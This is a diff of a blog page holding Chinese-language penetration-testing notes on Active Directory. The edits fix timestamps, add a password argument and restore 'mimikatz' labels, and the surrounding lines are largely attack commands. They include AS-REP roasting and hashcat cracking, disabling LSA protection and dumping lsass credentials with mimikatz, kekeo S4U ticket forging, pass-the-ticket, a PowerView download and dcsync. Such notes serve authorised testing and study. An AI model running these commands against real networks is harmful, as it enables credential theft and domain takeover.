@@ -33,7 +33,7 @@
 <meta property="og:description" content="迟来的文章">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-02-08T03:15:20.000Z">
-<meta property="article:modified_time" content="2023-05-31T14:44:24.617Z">
+<meta property="article:modified_time" content="2023-05-31T14:55:13.201Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Pentest">
 <meta name="twitter:card" content="summary">
@@ -209,7 +209,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-05-31 22:44:24" itemprop="dateModified" datetime="2023-05-31T22:44:24+08:00">2023-05-31</time>
+                <time title="Modified: 2023-05-31 22:55:13" itemprop="dateModified" datetime="2023-05-31T22:55:13+08:00">2023-05-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1060,7 +1060,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 <ul>
 <li>Username requiured</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span> -request -outfile tgt</span><br><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/ -usersfile <span class="variable">$user_file</span> -request -outfile tgt</span><br><span class="line">hashcat -m 18200 tgt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span>:<span class="variable">$password</span> -request -outfile tgt</span><br><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/ -usersfile <span class="variable">$user_file</span> -request -outfile tgt</span><br><span class="line">hashcat -m 18200 tgt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 <h3 id="获取运行程序-服务用户凭证"><a class="markdownIt-Anchor" href="#获取运行程序-服务用户凭证"></a> 获取运行程序、服务用户凭证</h3>
 <p>监听</p>
 <ul>
@@ -1114,7 +1114,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br><span class="line">runas &#x2F;savecred &#x2F;user:$user cmd.exe</span><br></pre></td></tr></table></figure>
 <ul>
-<li>&quot;</li>
+<li>mimikatz</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::credman</span><br></pre></td></tr></table></figure>
 <h3 id="laps"><a class="markdownIt-Anchor" href="#laps"></a> LAPS</h3>
@@ -1145,7 +1145,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 <li>Memory Dump
 <ul>
 <li>taskmgr</li>
-<li>&quot;</li>
+<li>mimikatz</li>
 </ul>
 </li>
 </ul>
@@ -1159,7 +1159,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa &#x2F;f RunAsPPL</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
 <ul>
-<li>&quot;<br />
+<li>mimikatz<br />
 (mimidrv.sys)</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">sekurlsa::logonpaswords</span><br></pre></td></tr></table></figure>
@@ -1233,11 +1233,11 @@ Windows Server 2019 won’t allow you to connect to another user’s session wit
 <h2 id="constrained-delegation"><a class="markdownIt-Anchor" href="#constrained-delegation"></a> Constrained Delegation</h2>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;PowerView.ps1 -O</span><br><span class="line">. .\PowerView.ps1</span><br><span class="line">get-netuser -trustedtoauth</span><br></pre></td></tr></table></figure>
 <p><strong>msds-allowedtodelegateto</strong></p>
-<p>&quot;</p>
+<p>mimikatz</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::secrets</span><br></pre></td></tr></table></figure>
 <p>kekeo</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:$user &#x2F;domain:$domain &#x2F;password:$password</span><br><span class="line">tgs::s4u &#x2F;tgt:$tgt_file &#x2F;user:$user &#x2F;service:$service&#x2F;$hostname</span><br></pre></td></tr></table></figure>
-<p>&quot;</p>
+<p>mimikatz</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::ptt $tgs_file</span><br></pre></td></tr></table></figure>
 <p>http + wsman -&gt; powershell remoting</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession -ComputerName $hostname</span><br><span class="line">Enter-PSSession -ComputerName $hostname</span><br></pre></td></tr></table></figure>
@@ -1386,10 +1386,9 @@ Windows Server 2019 won’t allow you to connect to another user’s session wit
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
 <h3 id="dcsync"><a class="markdownIt-Anchor" href="#dcsync"></a> dcsync</h3>
 <blockquote>
-<p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using &quot;<br />
-”<br />
+<p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br />
 <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a><br />
-&quot;<br />
+mimikatz<br />
 有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />
 《内网安全攻防》 P.296</p>
 </blockquote>
